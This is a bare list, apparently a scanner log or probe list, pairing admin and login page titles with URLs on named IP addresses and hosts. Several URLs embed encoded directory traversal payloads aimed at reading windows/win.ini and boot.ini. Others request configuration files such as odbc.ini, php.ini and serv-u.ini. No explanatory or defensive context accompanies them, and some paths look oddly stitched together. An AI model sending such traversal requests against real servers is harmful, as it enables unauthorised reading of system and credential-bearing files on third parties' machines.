oMail-admin Administration - Login,http://61-64-230-150-adsl-tpe.dynamic.so-net.net.tw/login/chloroquine24.com/odbc.ini
statistics - urchin (5|3|admin),http://210.200.17.137/loginsave/impex/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
phpnews.login,http://210.242.148.150/comments/search/view/odbc.ini
warning,http://210.202.233.178/netscape.ini
ListMail Login,http://210.202.233.191/loginflat/default.asp/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cwindows/win.ini
"\""PhpMyExplorer\"" - Login",http://cy210-202-233-170.ell.static.apol.com.tw/login/control/2082/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
communigate - Login Form,http://210.203.16.164/loginok/memberInfo.php//%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255cwindows/win.ini
Apache Tomcat,http://210.63.253.178/login-redirect/vsadmin/Activex//..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fboot.ini
System Statistics - Configuration.File,http://210.242.147.155/comments/fcgi-bin/tools/perform.ini
Supero Doctor III,http://210.242.146.169/login/cgi-bin/log/serv-u.ini
Admin - Connection Status,http://31.220.45.118/login1/modules/AllMyGuests/cgi-bin/netscape.ini
Login Form Login: Password: My Resource establishment were ...,http://103.225.3.178/login-Copy.asp/perform.ini
ePowerSwitch Login,http://203.105.230.160/login/log/pages/preferences.ini
statistics of,http://52.39.87.62:7547/login/etc/2082/php.ini
